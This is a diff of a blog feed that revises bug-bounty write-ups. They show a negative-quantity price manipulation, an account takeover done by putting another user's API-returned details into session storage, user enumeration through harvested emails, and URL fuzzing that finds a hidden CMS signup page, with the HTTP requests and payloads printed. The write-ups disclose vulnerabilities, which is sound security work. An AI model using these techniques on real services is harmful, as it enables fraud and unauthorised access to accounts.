+&lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;X-XSS-Protection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1; mode=block &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referrer-Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;strict-origin-when-cross-origin &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Strict-Transport-Security&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=31536000; includeSubDomains&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;saltedhash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hashcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;product_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;121212&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;price&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;quantity&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;-5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;amount_to_be_paid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;address&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ABC city, ABC.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;zipcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;123456&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By changing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;quantity&lt;/code&gt; value to a negative number, it was possible to pay a reduced amount for the orders placed.&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="blog" /><category term="Business Logic Error" /><category term="Misconfiguration" /><category term="Price Manipulation" /><summary type="html">Target Background The target of this analysis is a web application functioning as an e-commerce platform. It facilitates online purchases of various products and services by users.</summary></entry><entry><title type="html">Account Takeover Through Manipulation of Session Storage</title><link href="http://localhost:4000/Account_Takeover-via-session-storage/" rel="alternate" type="text/html" title="Account Takeover Through Manipulation of Session Storage" /><published>2023-03-30T12:00:00+05:30</published><updated>2023-03-30T12:00:00+05:30</updated><id>http://localhost:4000/Account_Takeover-via-session-storage</id><content type="html" xml:base="http://localhost:4000/Account_Takeover-via-session-storage/">&lt;h1 id=&quot;target-background&quot;&gt;Target Background&lt;/h1&gt;
+&lt;p&gt;The target of this analysis is a web application designed for financial purposes. It provides a comprehensive suite of features for generating, tracking, and reconciling invoices. Users can effectively manage payments and perform various financial activities within the application.&lt;/p&gt;
+
+&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;To evaluate the application’s security, I created a test account through the signup functionality. After logging in, the application prompted me to create an organization, allowing access to team members and assigning them specific roles based on their responsibilities.&lt;/p&gt;
+
+&lt;h2 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;ReactJS framework&lt;/li&gt;
+  &lt;li&gt;Akamai Web Application Firewall (WAF)&lt;/li&gt;
+  &lt;li&gt;Relies on REST APIs&lt;/li&gt;
+  &lt;li&gt;Utilizes cookie-based authentication&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&quot;user-enumeration&quot;&gt;User Enumeration&lt;/h2&gt;
-&lt;p&gt;At the login page after entering the username and password of my signed up user credentials the application sends a request to an API endpoint like below to verify whether the user is part of the organization, user exists in the DB or not.&lt;/p&gt;
+&lt;p&gt;During the login process, after entering my username and password, the application sent a request to an API endpoint to verify if the user was part of the organization or if the user existed in the database.&lt;/p&gt;
 
 &lt;h3 id=&quot;request&quot;&gt;Request&lt;/h3&gt;
 &lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api/v1/user?email=nj@tvhsecurity.com&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
@@ -37,7 +818,8 @@
 &lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Express &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;* &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json; charset=utf-8 &lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;370 ETag: W/&quot;172-rQhbOJIDRtY57xxDgEWDAhUpziE&quot; &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;370 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;W/&quot;172-rQhbOJIDRtY57xxDgEWDAhUpziE&quot; &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blah...blah...blah...; Path=/; HttpOnly &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff &lt;/span&gt;
@@ -70,20 +852,20 @@
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;post-login&quot;&gt;Post Login&lt;/h2&gt;
-&lt;p&gt;After logging in into the application i was going through the JS files and local storages and found that the session storage which stores the information that was fetched in the response from the above user verify request. The user results are stored exactly how it was fetched from the API response.&lt;/p&gt;
+&lt;p&gt;After logging into the application, I explored the JavaScript files and local storage. I discovered that the session storage stored information retrieved from the user verification request response, preserving the user’s details.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/blogs/ATO/session_storage.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;theory&quot;&gt;Theory&lt;/h2&gt;
-&lt;p&gt;My theory was initially to test the session storage once it might be vulnerable as the application is only using the encrypted cookies as authentication. In order to test that theory i need another user account so i have signed up another test account.&lt;/p&gt;
+&lt;p&gt;My initial theory aimed to test the session storage vulnerability as the application solely relied on encrypted cookies for authentication. To validate this theory, I needed another user account, so I created an additional test account.&lt;/p&gt;
 
-&lt;p&gt;Now we have 2 legitimate user accounts and we just have to test out the theory, it will work 100% if the application validates the users based on the session storage key &lt;strong&gt;values&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;With two legitimate user accounts, I tested the theory that it would work if the application verified users based on the session storage key &lt;strong&gt;values&lt;/strong&gt;.&lt;/p&gt;
 
-&lt;p&gt;The below screenshot shows the session storage of &lt;strong&gt;User1&lt;/strong&gt; account.&lt;/p&gt;
+&lt;p&gt;The screenshot below displays the session storage of the &lt;strong&gt;User1&lt;/strong&gt; account.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/blogs/ATO/Signed_up_user.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Now i just have to pass the &lt;strong&gt;User2&lt;/strong&gt; account email Id in the email verify request and it will provide all the details that i want to do the manipulation.&lt;/p&gt;
+&lt;p&gt;I simply had to pass the email ID of the &lt;strong&gt;User2&lt;/strong&gt; account in the email verification request to obtain the desired details for manipulation.&lt;/p&gt;
 
 &lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api/v1/user?email=nj+1@tvhsecurity.com&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;www.target.com&lt;/span&gt;
@@ -100,27 +882,27 @@
 &lt;span class=&quot;na&quot;&gt;Te&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;trailers&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;I have copied the required payload fron the JSON response and changed the session value of the &lt;strong&gt;login&lt;/strong&gt; key. After refrshing the page i was able to login into the &lt;strong&gt;User2 account&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;I copied the required payload from the JSON response and modified the session value of the &lt;strong&gt;login&lt;/strong&gt; key. Upon refreshing the page, I successfully logged into the &lt;strong&gt;User2&lt;/strong&gt; account.&lt;/p&gt;
 
-&lt;h3 id=&quot;notes-&quot;&gt;Notes:-&lt;/h3&gt;
+&lt;h3 id=&quot;notes&quot;&gt;Notes:&lt;/h3&gt;
 &lt;ul&gt;
   &lt;li&gt;User1 = nj@tvhsecurity.com&lt;/li&gt;
   &lt;li&gt;User2 = nj+1@tvhsecurity.com&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;Since both the accounts are fresh accounts i was unable to verify the issue as it is 100% solid, so inorder to verify it i have to make some financial stuffs in the application which was not possible at the moment.&lt;/p&gt;
+&lt;p&gt;Since both accounts were fresh and lacked real-world financial data, I was unable to definitively confirm the issue. To validate it, I needed to engage with the application’s financial functionalities, which was not feasible at that time.&lt;/p&gt;
 
-&lt;p&gt;So i decided why not to give a try for a live account. I have to enumerate the users present in the application which is nearly very easy to do all I need is a list of email Ids which belongs to the target organization.&lt;/p&gt;
+&lt;p&gt;Therefore, I decided to try the theory with a live account. To do so, I needed to enumerate the users within the application, which was relatively simple. I compiled a list of email IDs belonging to the target organization.&lt;/p&gt;
 
 &lt;h2 id=&quot;osint&quot;&gt;OSINT&lt;/h2&gt;
-&lt;p&gt;I have decided to do some OSINT recon on the target and get some email Id. After a while I did find some email Ids of the companies business peoples from the contact pages of the organization but all of them turned out to be a failure.&lt;/p&gt;
+&lt;p&gt;I conducted OSINT reconnaissance on the target, searching for email IDs. While browsing through the organization’s contact pages, I discovered some email IDs belonging to the company’s business personnel. Unfortunately, none of them proved to be successful.&lt;/p&gt;
 
 &lt;h3 id=&quot;github-recon&quot;&gt;GitHub Recon&lt;/h3&gt;
-&lt;p&gt;So i decided to do some recon on github using the dorks and found few email Ids via the issues feature. The peoples from the organization commented few issues to their product/services repository codes.&lt;/p&gt;
+&lt;p&gt;Next, I performed reconnaissance on GitHub using specific search queries and found a few email IDs in the issues section. Individuals from the organization had commented on issues related to their product/service repositories.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/blogs/ATO/github.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;I made a list and sent it to intruder and checked the content lenght, luckily few of them are valid.&lt;/p&gt;
+&lt;p&gt;I compiled a list of these email IDs and submitted them to Intruder to check the content length. Fortunately, a few of them yielded positive results.&lt;/p&gt;
 
 &lt;h2 id=&quot;verify-user&quot;&gt;Verify User&lt;/h2&gt;
 
@@ -144,9 +926,10 @@
 &lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Wed, 29 Mar 2023 05:59:48 GMT &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Express &lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;* &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json; charset=utf-8 &lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;370 ETag: W/&quot;172-rQhbOJIDRtY57xxDgEWDAhUpziE&quot; &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;370 &lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;W/&quot;172-rQhbOJIDRtY57xxDgEWDAhUpziE&quot; &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;; Path=/; HttpOnly &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;X-Frame-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;SAMEORIGIN &lt;/span&gt;
 &lt;span class=&quot;na&quot;&gt;X-Content-Type-Options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nosniff &lt;/span&gt;
@@ -161,7 +944,7 @@
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;result&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;UserId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;██&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;EmailId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ba████████@target.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;EmailId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ba████████@target.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;RegionId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
@@ -183,11 +966,11 @@
 
 &lt;h2 id=&quot;checkpoint&quot;&gt;Checkpoint&lt;/h2&gt;
 &lt;ul&gt;
-  &lt;li&gt;We have valid user email&lt;/li&gt;
-  &lt;li&gt;Details required to maipulate session value&lt;/li&gt;
+  &lt;li&gt;We have a valid user email&lt;/li&gt;
+  &lt;li&gt;Obtained the required details for session value manipulation&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3 id=&quot;extracted-new-session-value&quot;&gt;Extracted new session value&lt;/h3&gt;
+&lt;h3 id=&quot;extracted-new-session-value&quot;&gt;Extracted New Session Value&lt;/h3&gt;
 
 &lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;UserId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;██&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
@@ -206,44 +989,46 @@
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The above is the value that we have to pass in the session storage to test the theory.&lt;/p&gt;
+&lt;p&gt;The above value needs to be passed to the session storage to test the theory.&lt;/p&gt;
 
 &lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
-&lt;p&gt;Post successfully passing the extracted legitimate users details in the session storage value and after refreshing the page the application gave me access to that user’s accounts.&lt;/p&gt;
+&lt;p&gt;After successfully passing the extracted legitimate user’s details in the session storage value and refreshing the page, the application granted me access to the user’s account.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/blogs/ATO/Exploitation.png&quot; alt=&quot;exploit&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;As you can see i am able to view the invoices generated in the target user’s account.&lt;/p&gt;
+&lt;p&gt;As depicted in the screenshot, I was able to view the invoices generated in the target user’s account.&lt;/p&gt;
 
-&lt;p&gt;Please note that due to the non-disclosure agreement these are the only information i was allowed to share.&lt;/p&gt;
+&lt;p&gt;Please note that due to non-disclosure agreements, the information shared is limited.&lt;/p&gt;
 
-&lt;p&gt;Thanks for reading!&lt;/p&gt;
+&lt;p&gt;Thank you for reading!&lt;/p&gt;
 
-&lt;p&gt;Follow me on Twitter : &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;thevillagehacker&lt;/a&gt;&lt;/p&gt;</content><author><name>naveen</name></author><category term="blog" /><category term="Session Storage" /><category term="Account Takeover" /><category term="Misconfiguration" /><summary type="html">Target Background A Web application which can be used for financial purposes, in which we can generate the invoice, track and reconcile them. And the payments can be done for the invoices and money can be managed completely through the application .</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" /><media:content medium="image" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hacking MNC’s Content Management System due to misconfiguration and lack of authorization</title><link href="http://localhost:4000/Hacking_MNCs-CMS_Systems/" rel="alternate" type="text/html" title="Hacking MNC’s Content Management System due to misconfiguration and lack of authorization" /><published>2023-03-25T12:00:00+05:30</published><updated>2023-03-25T12:00:00+05:30</updated><id>http://localhost:4000/Hacking_MNCs-CMS_Systems</id><content type="html" xml:base="http://localhost:4000/Hacking_MNCs-CMS_Systems/">&lt;h2 id=&quot;target-background&quot;&gt;Target Background&lt;/h2&gt;
-&lt;p&gt;The target is a Multi National Company who has a billion dollar market and the stocks. The nature of the application is to create, edit and update the contents of their products/services. Once the content is published the updated contents will be pushed to the live website of the product/services page. Short form it’s a &lt;strong&gt;Content Management System application&lt;/strong&gt; - its a own product of the company built using reactJS.&lt;/p&gt;
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="blog" /><category term="Session Storage" /><category term="Account Takeover" /><category term="Misconfiguration" /><summary type="html">Target Background The target of this analysis is a web application designed for financial purposes. It provides a comprehensive suite of features for generating, tracking, and reconciling invoices. Users can effectively manage payments and perform various financial activities within the application.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" /><media:content medium="image" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Exploiting Misconfigurations and Authorization Vulnerabilities in a Multinational Company’s Content Management System</title><link href="http://localhost:4000/Hacking_MNCs-CMS_Systems/" rel="alternate" type="text/html" title="Exploiting Misconfigurations and Authorization Vulnerabilities in a Multinational Company’s Content Management System" /><published>2023-03-25T12:00:00+05:30</published><updated>2023-03-25T12:00:00+05:30</updated><id>http://localhost:4000/Hacking_MNCs-CMS_Systems</id><content type="html" xml:base="http://localhost:4000/Hacking_MNCs-CMS_Systems/">&lt;h2 id=&quot;target-background&quot;&gt;Target Background&lt;/h2&gt;
+&lt;p&gt;The target of this analysis is a prominent Multinational Company (MNC) with a significant market value and stock presence. The company utilizes a Content Management System (CMS) application built with ReactJS to create, edit, and update the content for their products and services. Once the content is published, it is pushed to the live website associated with the corresponding product or service.&lt;/p&gt;
 
 &lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
-&lt;p&gt;The application does not have any sign up page as this is a CMS application only the administrator of the application can create and assign roles to the users. The home page didn’t have any sign up buttons other than the login form - username, password, submit and forgot password buttons.&lt;/p&gt;
+&lt;p&gt;The CMS application lacks a sign-up page, and only the application administrator has the privilege to create user accounts and assign roles. The home page exclusively presents a login form, with no sign-up buttons.&lt;/p&gt;
 
-&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+&lt;h3 id=&quot;reconnaissance&quot;&gt;Reconnaissance&lt;/h3&gt;
+&lt;p&gt;During the reconnaissance phase, the following technologies and components were identified:&lt;/p&gt;
+
 &lt;ul&gt;
-  &lt;li&gt;reactJS&lt;/li&gt;
-  &lt;li&gt;Amazon CDN&lt;/li&gt;
+  &lt;li&gt;ReactJS&lt;/li&gt;
+  &lt;li&gt;Amazon CDN (Content Delivery Network)&lt;/li&gt;
   &lt;li&gt;REST APIs&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3 id=&quot;analyzing-loaded-source-files&quot;&gt;Analyzing loaded source files&lt;/h3&gt;
-&lt;p&gt;After analyzing the loaded source files in the application it clearlys shows that the user has to be legitimate to access the application. There were no REST API locations were mentioned in the JS files. The perfect way to proceed further is to fuzz the URL. After fuzzing the URL the signup endpoint were found &lt;strong&gt;https://abc.com/abc/xyz/signup.html&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;analysis-of-loaded-source-files&quot;&gt;Analysis of Loaded Source Files&lt;/h3&gt;
+&lt;p&gt;After thoroughly analyzing the loaded source files, it became evident that legitimate user credentials are required to access the application. No REST API endpoints were explicitly mentioned in the JavaScript files. To proceed further, a URL fuzzing technique was employed, leading to the discovery of the signup endpoint: &lt;strong&gt;https://abc.com/abc/xyz/signup.html&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;h2 id=&quot;misconfiguration---1&quot;&gt;Misconfiguration - 1&lt;/h2&gt;
-&lt;h3 id=&quot;sign-up&quot;&gt;Sign up&lt;/h3&gt;
-&lt;p&gt;Since the application does not have the signup option in the home page and the same has been configured in the different directory than the home login page. The developer might be intentionally did it or might have used it for internal purpose or forgot to remove from the directory.&lt;/p&gt;
+&lt;h3 id=&quot;sign-up-process&quot;&gt;Sign-up Process&lt;/h3&gt;
+&lt;p&gt;Due to the application’s design, the sign-up functionality is not accessible from the home page. It appears that the developer might have intentionally kept it separate, possibly for internal use or as a legacy feature that was not removed.&lt;/p&gt;
 
-&lt;p&gt;I have signed up an account, and luckily it doesn’t ask to confirm the information provided like email confirmation to create an account sccessfully.&lt;/p&gt;
+&lt;p&gt;By signing up for an account, it was observed that no additional confirmation steps, such as email verification, were required. The account creation process was successful without any validation of the provided information.&lt;/p&gt;
 
